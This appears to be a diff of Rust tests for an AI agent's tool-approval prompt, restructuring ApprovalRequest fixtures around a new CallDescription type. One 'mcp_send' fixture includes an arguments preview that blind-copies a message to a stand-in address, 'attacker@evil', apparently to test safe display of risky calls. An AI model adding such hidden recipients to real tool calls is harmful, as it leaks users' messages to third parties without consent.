@@ -395,8 +395,8 @@ mod tests {
     use unicode_width::UnicodeWidthStr;
 
     use ofx_contract::{
-        ApprovalRequest, ApprovalScope, CommandProfile, CommandRequest, PathAccess, RequestId,
-        SessionGrant,
+        ApprovalRequest, ApprovalScope, CallDescription, CommandProfile, CommandRequest,
+        Concurrency, PathAccess, RequestId, SessionGrant, ToolActivity, ToolCallId, ToolEffect,
     };
 
     use super::super::command_text::grapheme_fuzz::{Xorshift, random_clusters};
@@ -451,7 +451,14 @@ mod tests {
         let request = ApprovalRequest {
             id: RequestId::new(1),
             tool_name: "shell".to_owned(),
-            title: "Running a command".to_owned(),
+            call_id: ToolCallId::new("call-1"),
+            description: CallDescription {
+                title: "Running a command".to_owned(),
+                label: None,
+                activity: ToolActivity::Read,
+                effect: ToolEffect::ReadOnly,
+                concurrency: Concurrency::Serial,
+            },
             tool_arguments_preview: String::new(),
             tool_arguments_truncated: false,
             scope: ApprovalScope {
@@ -788,7 +795,14 @@ mod tests {
         let request = ApprovalRequest {
             id: RequestId::new(1),
             tool_name: "read_file".to_owned(),
-            title: format!("Reading {raw}"),
+            call_id: ToolCallId::new("call-1"),
+            description: CallDescription {
+                title: format!("Reading {raw}"),
+                label: None,
+                activity: ToolActivity::Read,
+                effect: ToolEffect::ReadOnly,
+                concurrency: Concurrency::Serial,
+            },
             tool_arguments_preview: String::new(),
             tool_arguments_truncated: false,
             scope: ApprovalScope {
@@ -806,7 +820,14 @@ mod tests {
         let request = ApprovalRequest {
             id: RequestId::new(1),
             tool_name: "mcp_send".to_owned(),
-            title: format!("Calling {raw}"),
+            call_id: ToolCallId::new("call-1"),
+            description: CallDescription {
+                title: format!("Calling {raw}"),
+                label: None,
+                activity: ToolActivity::Read,
+                effect: ToolEffect::ReadOnly,
+                concurrency: Concurrency::Serial,
+            },
             tool_arguments_preview: encode_terminal_safe(
                 format!(r#"{{"body":"{raw}","bcc":"attacker@evil"}}"#).as_bytes(),
                 usize::MAX,
